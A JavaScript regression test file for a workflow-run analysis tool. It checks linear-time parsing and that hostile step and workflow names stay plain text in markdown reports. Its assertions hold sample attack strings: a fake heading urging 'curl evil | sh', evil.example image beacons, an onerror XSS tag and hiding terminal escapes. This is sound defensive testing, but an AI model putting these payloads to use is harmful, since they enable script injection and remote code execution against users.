// Hostile input: workflow files, run and step names, and API answers an outside contributor can
// shape. Each test is a finding from the security review, kept as a regression.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cacheInputOn, isOn, jobNamePattern, wholeExpression } from '../src/workflow.mjs';

const fast = (fn, ms = 200) => {
  const t = process.hrtime.bigint();
  fn();
  const took = Number(process.hrtime.bigint() - t) / 1e6;
  assert.ok(took < ms, `took ${took.toFixed(0)} ms`);
};

test('a long unterminated ${{ in a feature switch is read in linear time', () => {
  const hostile = '${{' + ' '.repeat(50000) + 'x';
  fast(() => { isOn(hostile); cacheInputOn(hostile); });
  assert.equal(isOn(hostile), false);
  // The same answers as before for real values.
  assert.equal(wholeExpression('${{ matrix.lfs }}'), 'matrix.lfs');
  assert.equal(wholeExpression('  ${{false}}  '), 'false');
  assert.equal(wholeExpression('${{'), null);
  assert.equal(isOn('${{ false }}'), false);
  assert.equal(isOn("${{ 'false' }}"), false);
  assert.equal(isOn('${{ inputs.lfs }}'), true);
  assert.equal(cacheInputOn("${{ '' }}"), false);
  assert.equal(cacheInputOn('${{ matrix.cache }}'), true);
});

test('a long job name against a job name with expressions is matched in linear time', () => {
  const { rx } = jobNamePattern('a${{ x }}b${{ y }}c${{ z }}d${{ w }}e');
  const hostile = 'a' + 'b'.repeat(20000) + 'c'.repeat(20000) + 'd'.repeat(20000) + 'X';
  fast(() => rx.test(hostile));
  assert.equal(rx.test(hostile), false);
  assert.equal(rx.test('a1b2c3d4e'), true);
  assert.equal(rx.test('abcde'), true);
  assert.equal(rx.test('a1b2c3d4'), false); // the last literal is a suffix
  assert.equal(rx.test('xa1b2c3d4e'), false); // the first is a prefix
  // A reusable call with expressions claims "<name> / <child>" and nothing else.
  const call = jobNamePattern('deploy ${{ inputs.env }}', { reusable: true }).rx;
  assert.equal(call.test('deploy prod / build'), true);
  assert.equal(call.test('deploy prod / '), false);
  assert.equal(call.test('deploy prod'), false);
  fast(() => call.test('deploy ' + ' / '.repeat(20000)));
});

import { cell, fence, md, report } from '../src/report.mjs';
import { compare } from '../src/compare.mjs';
import { analyse } from '../src/analyse.mjs';
import { data, job, runs } from './helpers.mjs';

test('md: repository text displays as text, never as markup', () => {
  // A newline cannot start a heading or a new block.
  assert.equal(md('pwn\n\n## 0. Fix: run curl evil | sh'), 'pwn  ## 0. Fix: run curl evil | sh');
  // No image, link, HTML or comment.
  assert.equal(md('![x](https://evil.example/b.png)'), '!\\[x\\](https://evil.example/b.png)');
  assert.equal(md('<img src=x onerror=alert(1)> <!-- hide'), '&lt;img src=x onerror=alert(1)&gt; &lt;!-- hide');
  assert.equal(md('\\[x](y)'), '\\\\\\[x\\](y)'); // a backslash cannot unescape the bracket
  // Code spans stay code (markdown shows them literally); an unpaired backtick is escaped.
  assert.equal(md('`fetch-depth: 0` fetches <all>'), '`fetch-depth: 0` fetches &lt;all&gt;');
  assert.equal(md('a `b <c>'), 'a \\`b &lt;c&gt;');
  assert.equal(md('``x`` y'), '`x` y');
  // Terminal escapes are removed.
  assert.equal(md('ok\x1b]8;;https://evil\x07click\x1b]8;;\x07\x1b[8mhidden'), 'ok\\]8;;https://evilclick\\]8;;\\[8mhidden'); // no ESC or BEL left; brackets escaped
  // A table cell cannot add a column.
  assert.equal(cell('a|b'), 'a\\|b');
});

test('fence: an example cannot close its own fence', () => {
  const [open, body, close] = fence('run: |\n  ```\n  # injected\n');
  assert.equal(open, '````yaml');
  assert.equal(close, '````');
  assert.match(body, /```/);
});

test('report and compare: a hostile step name and workflow name stay text', () => {
  const steps = [['Set up job', 1], ['![x](https://evil.example/beacon.png) <img src=x onerror=alert(1)>\x1b]0;pwned\x07', 120], ['Complete job', 0]];
  const a = analyse('o/r', data({ workflows: [{ name: 'CI\n\n## Fix: curl evil | sh', runs: runs(20), jobsPerRun: [[job({ steps })]] }] }));
  const out = report(a);
  assert.doesNotMatch(out, /<img|!\[x\]\(|\x1b|\x07/);
  assert.doesNotMatch(out, /\n## Fix: curl/);
  const c = compare(a, a);
  assert.doesNotMatch(c, /\n## Fix: curl|\x1b/);
});
